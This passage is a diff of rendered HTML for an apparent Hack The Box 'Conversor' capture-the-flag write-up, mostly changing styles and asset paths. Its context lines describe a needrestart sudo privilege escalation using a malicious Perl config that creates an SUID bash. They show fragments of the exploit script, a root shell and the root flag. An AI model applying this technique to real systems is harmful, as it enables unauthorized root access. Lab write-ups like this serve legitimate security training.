 </span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
 </span></span><span style="display:flex;"><span>    <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin, use_pty
@@ -1136,7 +1136,7 @@ no filename sanitization was found in the upload handler, enabling path traversa
 <p>I wrote a Python script to automate the exploitation:
 Create a malicious Perl config file that copies /bin/bash and sets the SUID bit. Execute sudo needrestart pointing to this config. Spawn the SUID shell.</p>
 <p>priv.py:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#!/usr/bin/env python3</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">sys</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">subprocess</span>
@@ -1161,7 +1161,7 @@ Create a malicious Perl config file that copies /bin/bash and sets the SUID bit.
 </span></span><span style="display:flex;"><span>    print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&#34;Unexpected error: </span><span style="color:#a5d6ff">{</span>e<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&#34;</span>)
 </span></span><span style="display:flex;"><span>    sys<span style="color:#ff7b72;font-weight:bold">.</span>exit(<span style="color:#a5d6ff">1</span>)</span></span></code></pre></div></div>
 <p>Root obtained.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ python3 priv.py 
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ python3 priv.py 
 </span></span><span style="display:flex;"><span>Scanning processes...                                                                                              
 </span></span><span style="display:flex;"><span>Scanning linux images...                                                                                           
 </span></span><span style="display:flex;"><span>
@@ -1178,7 +1178,7 @@ Create a malicious Perl config file that copies /bin/bash and sets the SUID bit.
 </span></span><span style="display:flex;"><span>root
 </span></span><span style="display:flex;"><span>rootbash-5.1# </span></span></code></pre></div></div>
 <p>and flag:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rootbash-5.1# cat /root/root.txt
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rootbash-5.1# cat /root/root.txt
 </span></span><span style="display:flex;"><span>2ddbf40c03a3c45866748ea7e8c69444</span></span></code></pre></div></div>
 
           
@@ -1205,45 +1205,16 @@ Create a malicious Perl config file that copies /bin/bash and sets the SUID bit.
         
         <script
           type="text/javascript"
-          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          src="/bubka/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_writeups/HTB-Conversor/index.md"
-          data-oid-likes="likes_writeups/HTB-Conversor/index.md"></script>
+          data-oid="views_writeups\HTB-Conversor\index.md"
+          data-oid-likes="likes_writeups\HTB-Conversor\index.md"></script>
       
     </section>
 
     
     <footer class="pt-8 max-w-prose print:hidden">
       
-  
-    
-    
-    
-      
-      
-    
-    <div class="pt-8">
-      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
-      <div class="flex justify-between pt-3">
-        <span class="flex flex-col">
-          
-            <a
-              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
-              href="/writeups/htb-obfsc4t10n2/">
-              <span class="leading-6">
-                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HTB-oBfsC4t10n2
-              </span>
-            </a>
-            
-          
-        </span>
-        <span class="flex flex-col items-end">
-          
-        </span>
-      </div>
-    </div>
-  
-
 
       
     </footer>
@@ -1296,7 +1267,7 @@ Create a malicious Perl config file that copies /bin/bash and sets the SUID bit.
   
   <script
     type="text/javascript"
-    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    src="/bubka/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
     integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
   
   
@@ -1304,7 +1275,7 @@ Create a malicious Perl config file that copies /bin/bash and sets the SUID bit.
 <div
   id="search-wrapper"
   class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
-  data-url="http://localhost:1313/">
+  data-url="http://localhost:1313/bubka/">
   <div
     id="search-modal"
     class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
